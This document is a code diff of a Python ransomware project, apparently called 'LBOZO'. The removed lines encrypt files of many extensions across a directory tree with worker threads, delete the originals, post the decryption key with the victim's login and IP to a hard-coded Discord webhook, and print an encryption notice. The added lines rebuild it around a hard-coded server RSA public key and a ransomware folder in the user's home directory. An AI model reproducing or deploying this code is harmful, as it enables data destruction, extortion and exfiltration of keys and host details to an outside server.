@@ -3,43 +3,15 @@ from Crypto.Hash import SHA256
 from pathlib import Path
 import logging
 import concurrent.futures
-import string
 import os
-import random
-import time
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from discord_webhook import DiscordWebhook
-import socket
-
-# os.chdir(dirname(abspath(__file__)))
-os.system("cd ..")
-print(os.getcwd())
-
-if os.path.exists("./keys"):
-    pass
-else:
-    os.mkdir("./keys")
+import base64
+import Crypto.Random 
 
 global keypath
 keypath = "./keys/"
-
-
-def generate_keys():
-    key = RSA.generate(2048)
-    privatekey = key.export_key()
-    with open(f"{keypath}private.pem", "wb") as file:
-        file.write(privatekey)
-    publickey = key.publickey().export_key()
-    with open(f"{keypath}public.pem", "wb") as file:
-        file.write(publickey)
-
-
-if os.path.exists(f"{keypath}private.pem") and os.path.exists(f"{keypath}public.pem"):
-    pass
-else:
-    generate_keys()
 
 BLOCK_SIZE = 16
 BLOCK_MULTIPLIER = 100
@@ -49,32 +21,29 @@ ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.1234567890"
 
 maxWorker = 100
 
-
 def get_files(os_type):
     if os_type == "Windows":
         desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
 
 
-def encrypt_keyfile():
-    encrypt_key = RSA.import_key(open(f"{keypath}public.pem").read())
+def encrypt_keyfile(Client_private_key, server_public_key):
+    encrypt_key = RSA.import_key(server_public_key)
     cipher_rsa = PKCS1_OAEP.new(encrypt_key)
-    with open(f"{keypath}filekey.key", "rb") as file:
-        content = file.read()
-    encrypted_content = cipher_rsa.encrypt(content)
-    with open(f"{keypath}filekey.key", "wb") as file2:
-        file2.write(encrypted_content)
+    n = 16 # chunk length
+    chunks = [Client_private_key[i:i+n] for i in range(0, len(Client_private_key), n)]
+    final_encrypted = b""
+    for i in chunks:
+        encrypted_content = cipher_rsa.encrypt(i)
+        final_encrypted += encrypted_content
+    return final_encrypted
 
 
-def decypt_keyfile():
-    private_key = RSA.import_key(open(f"{keypath}private.pem").read())
+def decrypt_keyfile(encrypted_client_private_key, server_private_key):
+    private_key = RSA.import_key(server_private_key)
     cipher_rsa = PKCS1_OAEP.new(private_key)
-    with open(f"{keypath}filekey.key", "rb") as file:
-        content = file.read()
-    decrypted_content = cipher_rsa.decrypt(content)
-    with open(f"{keypath}filekey.key", "wb") as file2:
-        file2.write(decrypted_content)
-    with open(f"{keypath}filekey.key", "rb") as file3:
-        key = file3.read()
+    encrypted_content = encrypted_client_private_key
+    decrypted_content = cipher_rsa.decrypt(encrypted_content)
+    return decrypted_content
 
 
 def generateKey(length, key):
@@ -204,22 +173,6 @@ def getTargetFiles(fileExtension):
     return fileExtensions
 
 
-def generateEncryptThreads(fileExtensions, password, removeFiles, path):
-    fileExtensionFormatted = getTargetFiles(fileExtensions)
-    filePaths = []
-    for fileExtension in fileExtensionFormatted:
-        filePaths = filePaths + list(Path(path).rglob(fileExtension))
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
-        for filePath in filePaths:
-            global encryptCount
-            encryptCount = len(filePaths)
-            executor.submit(encryptFile, *(filePath, password))
-    if removeFiles:
-        for filePath in filePaths:
-            filePath.unlink()
-
-
 def generateDecryptThreads(password, removeFiles, path):
     filePaths = list(Path(path).rglob("*.[lL][bB][oO][zZ][oO]"))
     with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
@@ -245,15 +198,44 @@ def removeExFiles(fileExtensions, path):
         filePath.unlink()
 
 
-chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
-if os.path.exists(f"{keypath}filekey.key"):
-    decypt_keyfile()
-    pass
-else:
-    with open(f"{keypath}filekey.key", "wb") as filekey:
-        for x in range(0, 16):
-            password = "".join(random.SystemRandom().choice(chars) for _ in range(x))
-        filekey.write(password.encode())
+def generate_keys():
+    key = RSA.generate(2048)
+    privatekey = key.export_key()
+    with open(f"{keypath}private.pem", "wb") as file:
+        file.write(privatekey)
+    publickey = key.publickey().export_key()
+    with open(f"{keypath}public.pem", "wb") as file:
+        file.write(publickey)
+
+
+def encrypt_priv_key(msg, key):
+    n = 127
+    x = [msg[i:i+n] for i in range(0, len(msg), n)]
+
+    key = RSA.importKey(key)
+    cipher = PKCS1_OAEP.new(key)
+    encrypted = []
+    for i in x:
+        ciphertext = cipher.encrypt(i)
+        encrypted.append(ciphertext)
+    return encrypted
+
+
+server_public_key = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiTAUg6we9siwOP06O50/
+xAr+4G34MlX9HligZG0qUTmPeBiHbyOQTYDQ74VER7XOFJpUYWAy9AV6hGXZRvIk
+QYDt1MgSaxlQO/Lqdfe+NEpfa5tq7voLb38y8K0wYdgNs9GHgfCXu3tVb5D46pLf
+xkLA44P9pbxCbT2IV6uizSZJ+qxxjVpmvDchJ7i9zRpaoWQLv5gwf8EaYt2iGHul
+W7B2noLfLL0MK30Lho13BAKHzVPPT572EQWEge88rGrrgVJoTsx5E/n03QHOpTs8
+Psxko+hSoD7ACKZGeDc6PxIMVF0eav3EQsiTa6n81e3Epzx5bCZcCekX5C8gtfaj
+EwIDAQAB
+-----END PUBLIC KEY-----"""
+
+ransomware_path = os.path.expanduser("~") + "\LBOZO"
+
+client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")
+
+encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
 
 fileExtensions = [
     "AAC",
@@ -476,57 +458,3 @@ fileExtensions = [
     "PFX",
     "DER",
 ]
-
-removeFiles = True
-
-#   userdata = os.path.expanduser("~")
-
-paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
-
-#   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
-#   paths.append(userdata)
-
-
-format = "%(asctime)s: %(message)s"
-logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
-with open(f"{keypath}filekey.key", "rb") as filekey:
-    password = filekey.read().decode()
-
-print(password)
-encrypt_keyfile()
-
-if os.path.exists(f"{keypath}finished.done"):
-    pass
-else:
-    hostname = socket.gethostname()
-    for x in paths:
-        path = x
-        startTime = time.time()
-        generateEncryptThreads(fileExtensions, password, removeFiles, path)
-        endTime = time.time()
-        webhook = DiscordWebhook(
-            url="https://discord.com/api/webhooks/993006430649057381/3vHNIXKrQIg0F1tGVF0R60yRr8YvfJRgVUoFDClPnNDb-EsrdYKTYbpJXV9O14LDgRE5",
-            content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
-        )
-        webhook.execute()
-    with open(f"{keypath}finished.done", "w") as finished:
-        finished.close()
-
-
-print(f"Oh no! Your files have been encrypted!")
-
-#   this is where you would traditionally call a ransom, we are instead just asking for a password that will be used to decrypt the files
-#   ransom()
-
-decryptend = input("Enter password to decrypt: ")
-if decryptend == password:
-    for x in paths:
-        path = x
-        generateDecryptThreads(password, removeFiles, path)
-    os.remove(f"{keypath}filekey.key")
-    os.remove(f"{keypath}private.pem")
-    os.remove(f"{keypath}public.pem")
-    os.remove(f"{keypath}finished.done")
-else:
-    print("Oops! Wrong password!")
-    exit()
